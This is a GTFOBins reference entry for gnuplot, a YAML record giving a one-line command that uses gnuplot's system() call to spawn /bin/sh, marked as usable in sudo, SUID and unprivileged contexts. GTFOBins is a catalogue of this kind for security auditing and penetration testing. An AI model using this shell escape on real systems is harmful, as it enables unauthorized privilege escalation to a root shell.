<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/gnuplot -->
---
functions:
  shell:
  - code: |-
      gnuplot -e 'system("/bin/sh 1>&0")'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
